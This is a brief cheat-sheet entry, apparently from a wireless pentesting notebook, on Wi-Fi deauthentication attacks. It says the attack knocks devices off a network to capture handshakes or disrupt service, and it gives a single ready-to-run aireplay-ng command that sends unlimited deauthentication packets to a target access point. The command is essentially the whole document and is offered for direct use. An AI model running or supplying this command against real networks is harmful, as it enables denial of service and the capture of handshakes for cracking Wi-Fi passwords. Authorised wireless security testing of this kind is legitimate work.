# Deauthentication Attack

This attack forces devices off the network, causing them to reconnect. This can be used to capture handshakes or disrupt the network.

## Commands

#### 1) Sends deauthentication packets to a network

    aireplay-ng --deauth 0 -a BSSID wlan0mon

